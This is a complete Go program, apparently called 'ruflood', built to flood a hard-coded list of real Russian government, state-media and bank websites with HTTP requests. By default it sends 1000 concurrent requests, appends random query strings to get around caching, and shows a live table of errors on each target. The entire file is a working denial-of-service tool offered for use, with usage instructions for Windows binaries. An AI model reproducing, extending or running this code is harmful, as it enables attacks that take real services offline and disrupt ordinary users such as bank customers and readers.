package main

import (
	"context"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"sort"
	"strconv"
	"sync"
	"time"

	"github.com/jedib0t/go-pretty/v6/table"
)

type Config struct {
	MaxConcurrentRequests int
	RequestTimeout        time.Duration
	PrintInterval         time.Duration
	Targets               []string
}

type Stat struct {
	StatusCode int
	ReqNo      int
	ReqErr     int
	Msg        string
	lock       sync.RWMutex
}

type Result struct {
	StatusCode int
	Msg        string
	WasErr     bool
}

type Target struct {
	Url     string
	Updater chan Result
}

var defaultTargets = []string{
	"https://lenta.ru/", // newspaper, owned by sberbank
	"https://ria.ru/",   // state-owned news agency
	"https://ria.ru/lenta/",
	"https://www.rbc.ru/",
	"https://www.rt.com/", // state-controlled TV network (formerly Russia Today)
	"http://kremlin.ru/",
	"http://en.kremlin.ru/",
	"https://smotrim.ru/",
	"https://tass.ru/",     // state-controlled news agency
	"https://tvzvezda.ru/", // army-/MoD-controlled TV station
	"https://vsoloviev.ru/",
	"https://www.1tv.ru/",
	"https://www.vesti.ru/",
	"https://sberbank.ru/", // biggest russian bank
	"https://online.sberbank.ru/",
	"https://rkn.gov.ru/",      // state bureau for media oversight
	"https://sputniknews.com/", // state-owned news agency
}

func main() {
	cfg := ParseArgs()

	fmt.Printf("print interval: %v\n", cfg.PrintInterval)
	fmt.Printf("max concurrent requests: %v\n", cfg.MaxConcurrentRequests)
	fmt.Printf("request timeout: %v\n", cfg.RequestTimeout)
	fmt.Print("targets: ")
	for i, target := range cfg.Targets {
		if i == 0 {
			fmt.Println(target)
		} else {
			fmt.Printf("         %v\n", target)
		}
	}
	fmt.Println("You can stop the program ANYTIME by hitting Ctrl+C in the command line/terminal this program is running in.")
	fmt.Println()
	fmt.Println("The websites listed above will be flooded. If you want to modify the list, run the program with wanted websites appended at the end, e.g.")
	fmt.Println()
	fmt.Println("    ruflood-windows-amd64.exe https://first.website.ru http://second.website.ru")
	fmt.Println()
	fmt.Println("or, if you just want to add to the default list of websites, use the -a or --add-to-default-targets argument, e.g. like this")
	fmt.Println()
	fmt.Println("    ruflood-windows-amd64.exe -a https://first.website.ru http://second.website.ru")
	fmt.Println()

	starter := make(chan struct{})
	go func() {
		for n := 10; n > 0; n-- {
			fmt.Printf("\rRussian warship, go fuck yourself in %2d s", n)
			time.Sleep(time.Second)
		}
		fmt.Println()
		starter <- struct{}{}
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt)

	select {
	case <-starter:
		//nop
	case <-sigCh:
		fmt.Println("cancelled")
		return
	}

	ctx, cancel := context.WithCancel(context.Background())
	go Flood(ctx, cfg)

	<-sigCh
	fmt.Println("cancelled")
	cancel()
}

func ParseArgs() Config {
	cfg := Config{
		MaxConcurrentRequests: 1000,
		PrintInterval:         time.Millisecond * 1000,
		RequestTimeout:        time.Millisecond * 1000,
		Targets:               []string{},
	}

	targets := map[string]struct{}{}

	arg := ""
	for i := 1; i < len(os.Args); i++ {
		argv := os.Args[i]
		switch arg {
		case "":
			switch argv {
			case "-c":
				fallthrough
			case "--max-concurrent-requests":
				arg = "c"
			case "-r":
				fallthrough
			case "--request-timeout":
				arg = "r"
			case "-i":
				fallthrough
			case "--print-interval":
				arg = "i"
			case "-a":
				fallthrough
			case "--add-to-default-targets":
				for _, target := range defaultTargets {
					targets[target] = struct{}{}
				}
			case "-h":
				fallthrough
			case "--help":
				fmt.Printf("Usage: %s [OPTIONS] [targets...]\n\n", os.Args[0])
				fmt.Println("Floods russian state/bank/state-owned media websites with requests. The positional argument targets is a (whitespace separated) list of websites to flood. If unspecified, a default list will be used.")
				fmt.Println()
				fmt.Println("OPTIONS")
				fmt.Println("-i | --print-interval i")
				fmt.Println("\tInterval of printing result statistics, in milliseconds. 0 (zero) turns the printing off. Must be >= 0. Default is 1000.")
				fmt.Println()
				fmt.Println("-c | --max-concurrent-requests c")
				fmt.Println("\tMaximum number of concurrently running requests. Must be > 0. Default is 1000.")
				fmt.Println()
				fmt.Println("-r | --request-timeout r")
				fmt.Println("\tTimeout for an individual request, in milliseconds. 0 (zero) makes requests without timeout (i.e. they will wait for response indefinitely). Default is 1000.")
				fmt.Println()
				fmt.Println("-a | --add-to-default-targets")
				fmt.Println("\tIf specified, targets passed to the program will be added to the defaults, instead of replacing them. Duplicates will be removed.")
				os.Exit(0)
			default:
				arg = "t"
				i--
			}
		case "c":
			v, err := strconv.Atoi(argv)
			if err != nil {
				panic("invalid value of -c | --max-concurrent-requests")
			}
			if v <= 0 {
				panic("value of -c | --max-concurrent-requests must be > 0")
			}
			cfg.MaxConcurrentRequests = v
			arg = ""
		case "r":
			v, err := strconv.Atoi(argv)
			if err != nil {
				panic("invalid value of -r | --request-timeout")
			}
			if v <= 0 {
				panic("value of -r | --request-timeout must be >= 0")
			}
			cfg.RequestTimeout = time.Millisecond * time.Duration(v)
			arg = ""
		case "i":
			v, err := strconv.Atoi(argv)
			if err != nil {
				panic("invalid value of -i | --print-interval")
			}
			if v < 0 {
				panic("value of -i | --print-interval must be >= 0")
			}
			cfg.PrintInterval = time.Millisecond * time.Duration(v)
			arg = ""
		case "t":
			targets[argv] = struct{}{}
		}
	}

	switch arg {
	case "i":
		panic("no value provided for -i | --print-interval")
	case "c":
		panic("no value provided for -c | --max-concurrent-requests")
	case "r":
		panic("no value provided for -r | --request-timeout")
	}

	for target := range targets {
		cfg.Targets = append(cfg.Targets, target)
	}

	if len(cfg.Targets) == 0 {
		cfg.Targets = defaultTargets
	}

	sort.Strings(cfg.Targets)

	return cfg
}

// Flood runs the main flooding loop.
func Flood(ctx context.Context, cfg Config) {
	stats := map[string]*Stat{}
	updaters := map[string]chan Result{}
	for _, t := range cfg.Targets {
		stat := &Stat{ReqNo: 0, ReqErr: 0}
		updaterCh := make(chan Result)
		stats[t] = stat
		updaters[t] = updaterCh
		go Updater(stat, updaterCh)
	}

	if cfg.PrintInterval > 0 {
		go func() {
			for {
				time.Sleep(cfg.PrintInterval)
				switch runtime.GOOS {
				case "linux":
					cmd := exec.Command("clear")
					cmd.Stdout = os.Stdout
					cmd.Run()
				case "windows":
					cmd := exec.Command("cmd", "/c", "cls")
					cmd.Stdout = os.Stdout
					cmd.Run()
				}
				t := table.NewWriter()
				t.SetOutputMirror(os.Stdout)
				t.AppendHeader(table.Row{"target", "errors/total", "last status code", "last error"})
				for _, target := range cfg.Targets {
					stat := stats[target]
					stat.lock.RLock()
					t.AppendRow(table.Row{
						target,
						fmt.Sprintf("%d / %d", stats[target].ReqErr, stats[target].ReqNo),
						stats[target].StatusCode,
						stats[target].Msg,
					})
					stat.lock.RUnlock()
				}
				t.Render()
			}
		}()
	}

	concurrencyCap := make(chan struct{}, cfg.MaxConcurrentRequests)
	done := ctx.Done()

	for i := 0; ; i++ {
		select {
		case _, notDone := <-done:
			if !notDone {
				return
			}
		default:
			//nop
		}

		target := cfg.Targets[i%len(cfg.Targets)]
		// fmt.Printf("%d: %s\n", i, target)
		updaterCh := updaters[target]
		url := target
		if i/len(cfg.Targets)%13 == 0 {
			url = fmt.Sprintf("%s?%d", target, rand.Intn(10000))
		}

		concurrencyCap <- struct{}{}
		go func() {
			res := MakeRequest(url, cfg.RequestTimeout)
			updaterCh <- res
			select {
			case <-concurrencyCap:
				//nop
			default:
				//nop
			}
		}()
	}
}

// Updater updates the statistics based on latest result.
func Updater(stat *Stat, updaterCh chan Result) {
	for {
		res, more := <-updaterCh
		if !more {
			break
		}
		stat.lock.Lock()
		stat.Msg = res.Msg
		stat.ReqNo += 1
		if res.WasErr {
			stat.ReqErr += 1
		}
		stat.lock.Unlock()
	}
}

// MakeRequest performs a request to the specified target with a timeout.
func MakeRequest(target string, timeout time.Duration) Result {
	var res *http.Response
	var err error

	if timeout == 0 {
		res, err = http.Get(target)
	} else {
		transport := http.Transport{
			Dial: func(network, addr string) (net.Conn, error) {
				return net.DialTimeout(network, addr, timeout)
			},
		}

		client := &http.Client{
			Transport: &transport,
		}

		res, err = client.Get(target)
	}

	if err != nil {
		return Result{Msg: err.Error(), WasErr: true}
	}
	if res != nil && res.StatusCode >= 400 {
		return Result{StatusCode: res.StatusCode, Msg: res.Status, WasErr: true}
	}
	return Result{Msg: "", WasErr: false}
}
